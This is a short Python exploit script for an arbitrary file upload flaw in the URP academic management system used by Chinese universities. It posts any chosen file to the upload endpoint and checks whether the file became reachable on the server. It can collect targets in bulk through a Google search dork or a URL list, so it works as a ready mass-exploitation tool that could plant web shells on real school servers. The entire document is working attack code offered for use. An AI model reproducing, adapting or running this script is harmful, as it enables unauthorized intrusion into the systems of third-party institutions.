#!/usr/bin/env python
# encoding: utf-8
# coded by quinner, a responsible coder.
 
from __future__ import unicode_literals, print_function
 
from os.path import split, splitext
from optparse import OptionParser
from requests import head, post
from google import search
 
def upload(url, file):
    uploadurl = url + 'lwUpLoad_action.jsp'
    try:
    	fileurl = url+'lwUpLoadTemp/'+split(file)[1]
    	post(uploadurl, proxies={'http':'http://localhost:8080/'}, files={
    	'theFile':open(file, 'rb')
    	}, data={
    	'xh':splitext(split(file)[1])[0],
    	'wjlx':'pdf',
    	})
    except:
    	pass
    try:
    	if head(fileurl).status_code in (200,):
    		print('! '+fileurl)
    except:
    	pass
 
def main(opt, file):
    if opt.google and (not opt.url):
        for url in search(('intitle:"URP 综合教务系统- 登录"' if opt.google == 'default' else opt.google), tld='com.hk', lang='cn'):
            if url: upload(url, file)
    elif opt.read and (not opt.url):
        for url in open(opt.read, 'r'):
            if url: upload(url.strip('\r\n'), file)
    else:
        upload(opt.url, file)
 
if __name__ == '__main__':
    parser = OptionParser(usage='Usage: %prog [option] file')
    parser.add_option('-u', '--url', help='指定上传地址')
    parser.add_option('-r', '--read', help='从文本文档中读取URL地址')
    parser.add_option('-g', '--google', help='从Google搜集上传地址，参数为default使用默认语句收集')
    (opt, args) = parser.parse_args()
    if not args:
        parser.print_help()
        exit()
    main(opt, args[0])
